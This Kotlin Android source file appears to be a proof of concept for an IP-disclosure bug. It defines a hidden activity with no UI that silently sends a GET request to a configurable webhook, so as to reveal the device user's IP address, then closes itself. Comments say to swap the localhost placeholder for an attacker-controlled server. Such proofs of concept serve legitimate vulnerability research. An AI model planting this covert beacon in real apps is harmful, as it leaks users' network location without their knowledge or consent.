package com.example.securevaultipdisclosure

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class IPLeakActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // This activity has no UI, so we don't need to set a content view.
        // It simply performs an action and exits.

        // The URL for the server that will receive the IP address.
        // You can use a service like "webhook.site" to test this.
        // **IMPORTANT**: Replace this with your own URL to see the results.
        val webhookUrl = "http://127.0.0.1:8080"

        Log.e("IPLeakActivity", "Vulnerability triggered! Attempting to send IP to $webhookUrl")

        // Perform the network request in a new thread, as network operations are not allowed on the main thread.
        thread {
            try {
                // Open a connection to the specified URL.
                val url = URL(webhookUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                // Connect to the server. The act of making this connection sends the user's IP address.
                val responseCode = connection.responseCode
                Log.e("IPLeakActivity", "Network request completed with response code: $responseCode")

                // You can optionally read the response, but for this vulnerability, the request itself is the payload.
                connection.inputStream.close()
                connection.disconnect()

            } catch (e: Exception) {
                // Log any errors that occur during the network request.
                Log.e("IPLeakActivity", "wikwiiiiiik", e)
                Log.e("IPLeakActivity", "Failed to send IP address", e)
            }

            // Immediately finish the activity so the user doesn't see a blank screen.
            finish()
        }
    }
}
